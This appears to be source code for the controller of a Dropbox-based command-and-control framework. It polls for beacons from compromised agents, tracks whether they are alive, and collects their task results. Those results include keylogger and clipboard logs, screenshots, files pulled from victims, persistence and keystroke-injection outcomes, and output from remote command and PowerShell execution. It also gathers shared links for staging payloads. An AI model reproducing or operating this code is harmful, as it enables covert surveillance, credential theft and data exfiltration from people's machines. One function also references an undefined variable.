# -*- coding: utf8 -*-
import config as cfg
from lib import helpers
from lib.crypto import Crypto
import threading
import os.path
from datetime import *

#****************************************************************************************
# Class for the polling thread and task result treatment
#****************************************************************************************
class PollingThread:
	""" This class contains the polling thread function as well as the task result treatment function
	"""

	#------------------------------------------------------------------------------------
	def __init__(self, dropboxHandler, statusHandler):
		self.dropboxHandler = dropboxHandler
		self.statusHandler = statusHandler
		self.pollingThreadEnabled = True
		self.pollingPeriod = cfg.defaultPollingPeriod

	#------------------------------------------------------------------------------------
	def stopPollingThread(self):
		self.pollingThreadEnabled = False

	#------------------------------------------------------------------------------------
	def treatTaskResult(self, task, taskResultFilePath):
		 # We have a match for a pending task that has completed
		agentID = task['agentID']
		taskID = task['id']
		args = task['args']
		cmd = task['cmd']
		proceed = True

		# Read the task result file
		result = Crypto.decryptData(self.dropboxHandler.readFile(taskResultFilePath, resultFormat="bytes"), self.statusHandler.masterKey)
		
		# Error handling
		if result is None:
			proceed = False
		elif cmd not in ['runCLI', 'runPSModule']:
			if result.startswith("ERROR"):
				print helpers.color("\n[!] Task ID [{}] on agent ID [{}] failed with error: [{}]".format(taskID, agentID, result))
				proceed = False

		# Proceed with task result treatment
		if proceed:			
			if cmd in ['runCLI', 'runPSModule']:
					print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed".format(taskID, agentID))
					print "[{}]".format(task['cmd'])
					print ""
					print result
						
			elif cmd in ['launchProcess', 'polling', 'sendkeystrokes', 'persist']:
					print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))
					
			elif cmd == "getFile":
				agentFile = args[0]
				# Compute a local file name based on the agent file name
				localFile = os.path.join(cfg.defaultPath['incoming'], os.path.basename(agentFile.replace("\\","/")))
				print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))
				print helpers.color("[*] Please wait while downloading file [{}] and saving it to [{}]".format(result,localFile))
				with open(localFile, 'w+') as fileHandle:
					fileHandle.write(Crypto.decryptData(self.dropboxHandler.readFile(result, resultFormat="bytes"), self.statusHandler.masterKey))
					fileHandle.close()
				print helpers.color("[*] File saved [{}]".format(localFile))
				# Delete the remote file
				self.dropboxHandler.deleteFile(result)
				
			elif cmd == "sendFile":
				print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))
				print helpers.color("[*] [{}]".format(result))
					
			elif cmd == "sleep":
				self.statusHandler.setAgentAttribute(agentID, "wakeUpTime", result.split(",")[1])
				self.statusHandler.setAgentAttribute(agentID, "status", "SLEEPING")
				print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))
				print helpers.color("[*] Agent is going to sleep")
			
			elif cmd == "keylogger":
				if args[0] == "stop":
					localFile = os.path.join(cfg.defaultPath['incoming'], "keylogger.txt")
					print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully".format(taskID, agentID))
					print helpers.color("[*] Saving keylogger results to file [{}]".format(localFile))
					with open(localFile, 'w+') as fileHandle:
						fileHandle.write(result)
						fileHandle.close()
					print helpers.color("[*] File saved [{}]".format(localFile))
				else:
					print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))

			elif cmd == "clipboardlogger":
				if args[0] == "stop":
					print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully".format(taskID, agentID))
					localFile = os.path.join(cfg.defaultPath['incoming'], "clipboardlogger.txt")
					
					print helpers.color("[*] Saving clipboard logger results to file [{}]".format(localFile))
					with open(localFile, 'w+') as fileHandle:
						fileHandle.write(result)
						fileHandle.close()
					print helpers.color("[*] File saved [{}]".format(localFile))
				else:
					print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))

			elif cmd == "screenshot":
				# Compute a local file name based on the agent file name
				localFile = os.path.join(cfg.defaultPath['incoming'], "screenshot.jpg")
				print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))
				print helpers.color("[*] Please wait while downloading file [{}] and saving it to [{}]".format(result,localFile))
				with open(localFile, 'w+') as fileHandle:
					fileHandle.write(Crypto.decryptData(self.dropboxHandler.readFile(result, resultFormat="bytes"), self.statusHandler.masterKey))
					fileHandle.close()
				print helpers.color("[*] File saved [{}]".format(localFile))
				# Delete the remote file
				self.dropboxHandler.deleteFile(result)

			elif cmd == "stop":
				self.statusHandler.setAgentAttribute(agentID, "status", "DEAD")
				self.dropboxHandler.deleteFile(self.statusHandler.getAgentAttribute(agentID, "statusFile"))
				self.dropboxHandler.deleteFile(self.statusHandler.getAgentAttribute(agentID, "commandFile"))
				print helpers.color("\n[*] Task ID [{}] on agent ID [{}] completed successfully [{}]".format(taskID, agentID, result))
					
		# Remove the task from the task list
		self.statusHandler.removeTask(task)
		
		# Delete the task result file on the server
		self.dropboxHandler.deleteFile(taskResultFilePath)

	#------------------------------------------------------------------------------------
	def treatPushedData(self, pushedDataFilePath):
		# Read the pushed data result file
		result = Crypto.decryptData(self.dropboxHandler.readFile(pushedDataFilePath, resultFormat="bytes"), self.statusHandler.masterKey)

		# Error handling
		if result is None:
			print helpers.color("\n[!] Error retrieving data pushed by the agent ID [{}]".format(agentID))
		else:
			print result

		# Delete the push result file on the server
		self.dropboxHandler.deleteFile(pushedDataFilePath)

	#------------------------------------------------------------------------------------
	def doPoll(self):
		""" This function runs periodically (every 'pollingPeriod' seconds)
			It checks various files on the C2 server:
				- list available agents and their status
				- result of agent's tasks
				- published agent stages
		"""
		# First check if polling has been disabled
		if not self.pollingThreadEnabled:
			return
		
		# List the application's root folder 
		folderList = self.dropboxHandler.listFolder("")

		if folderList is not None:
			nowUTC = datetime.utcnow()
			delta = timedelta(minutes = 1) # Time delta of 1 minute to decide on agent's health
	
			# If present, each entry is either a file or directory
			for entry in folderList['entries']:
		
				#-----------------------------------------------------------------------------------------------
				# Looking for ".status" extension's files representing each agent's status file
				if entry['name'].endswith(".status"):
					# Get the agent ID
					agentID = entry['name'][0:-7] # removing the extension to get the actual agent ID
					
					# If this agent is *KNOWN* to be sleeping and its wake up time has not yet been reached
					# just do nothing with it and skip this entry
					if self.statusHandler.agentIsKnown(agentID) and self.statusHandler.agentIsSleeping(agentID):
						agentWakeUpTimeUTC = self.statusHandler.getAgentWakeUpTimeUTC(agentID)
						if nowUTC < agentWakeUpTimeUTC:
							continue

					# Get the file's last modified time (ie: last beacon)
					agentLastBeacon = entry['server_modified']
					agentLastBeaconUTC = datetime.strptime(agentLastBeacon,"%Y-%m-%dT%H:%M:%SZ")
					
					# If it's an agent we've already discovered, set its lastBeacon attribute
					if self.statusHandler.agentIsKnown(agentID):
						self.statusHandler.setAgentAttribute(agentID, "lastBeacon", agentLastBeacon)
					# Else, it's a new agent we've discovered, let's record it
					else:
						self.statusHandler.createAgent(agentID, agentLastBeacon, entry['path_lower'])
						print helpers.color("[+] Agent found with ID {}".format(agentID))
					
					# If it's a new agent, we must check its actual status
					if self.statusHandler.agentIsNew(agentID):
						# Maybe the agent is SLEEPING, let's check this
						content = self.dropboxHandler.readFile(self.statusHandler.getAgentAttribute(agentID, "statusFile"))
						if content is not None and content.startswith("SLEEPING"):
							agentWakeUpTime = content.split(",")[1] # Retrieve expected wake up time
							agentWakeUpTimeUTC = datetime.strptime(agentWakeUpTime,"%Y-%m-%dT%H:%M:%SZ")

							# Have we passed the wake up time ?
							if nowUTC > agentWakeUpTimeUTC:
								self.statusHandler.setAgentAttribute(agentID, "status", "DEAD")
							else:
								self.statusHandler.setAgentAttribute(agentID, "status", "SLEEPING")
								self.statusHandler.setAgentAttribute(agentID, "wakeUpTime", agentWakeUpTime)
								print helpers.color("[*] Agent with ID {} is sleeping".format(agentID))

					# Check if the agent's lastBeacon is older than a minute
					if (nowUTC - agentLastBeaconUTC) > delta:
						self.statusHandler.setAgentAttribute(agentID, "status", "DEAD")
					else:
						if self.statusHandler.agentIsNew(agentID):
							self.statusHandler.setAgentAttribute(agentID, "status", "ALIVE")
						if self.statusHandler.agentIsDead(agentID):
							self.statusHandler.setAgentAttribute(agentID, "status", "ALIVE")
							print helpers.color("[*] Agent with ID [{}] has become alive".format(agentID))
						elif self.statusHandler.agentIsSleeping(agentID):
							agentWakeUpTimeUTC = self.statusHandler.getAgentWakeUpTimeUTC(agentID)
							if nowUTC >= agentWakeUpTimeUTC:
								self.statusHandler.setAgentAttribute(agentID, "status", "ALIVE")
								self.statusHandler.setAgentAttribute(agentID, "wakeUpTime", "N/A")
								print helpers.color("[*] Agent with ID [{}] has woken up".format(agentID))

				#-----------------------------------------------------------------------------------------------
				# Looking for ".aa" extension's files representing a published stage
				elif entry['name'].endswith(".aa"):
					stageName = entry['name'].split('.')[0]
					if stageName not in self.statusHandler.publishedStageList:
						# Get the shared link for this file
						content = self.dropboxHandler.getSharedLink(entry['path_lower'])
						if content is not None and len(content['links']) > 0:
							stageLink = content['links'][0]['url'].replace("dl=0","dl=1")
							self.statusHandler.addStage(stageName, stageLink)
							print helpers.color("[+] Found a published stage: [{}]".format(stageName))
						else:
							self.statusHandler.addStage(stageName, "NONE")
							print helpers.color("[!] Published stage [{}] doesn't seem to be shared with a public link".format(entry['name']))

				#-----------------------------------------------------------------------------------------------
				# Looking for ".mm" extension's files representing a published module
				elif entry['name'].endswith(".mm"):
					moduleName = entry['name'].split('.')[0]
					if moduleName not in self.statusHandler.publishedModuleList:
						# Get the shared link for this file
						content = self.dropboxHandler.getSharedLink(entry['path_lower'])
						if content is not None and len(content['links']) > 0:
							moduleLink = content['links'][0]['url'].replace("dl=0","dl=1")
							self.statusHandler.addModule(moduleName, moduleLink)
							print helpers.color("[+] Found a published module: [{}]".format(moduleName))
						else:
							self.statusHandler.addModule(moduleName, "NONE")
							print helpers.color("[!] Published module [{}] doesn't seem to be shared with a public link".format(entry['name']))
				
				#-----------------------------------------------------------------------------------------------
				# Looking for ".push" extension's files representing a push of data initiated by the agent
				elif entry['name'].endswith(".dd"):
					self.treatPushedData(entry['path_lower'])

				#-----------------------------------------------------------------------------------------------
				# Check for tasks resulting files
				else:
					# Check all pending tasks, for any agent we might have been working on
					for task in self.statusHandler.pendingTaskList:
						if entry['name'] == task['fileName']:
							# Treat the task results
							self.treatTaskResult(task, entry['path_lower'])

		# Eventually, re-enable the polling thread
		if self.pollingThreadEnabled:
			threading.Timer(self.statusHandler.pollingPeriod, self.doPoll).start()
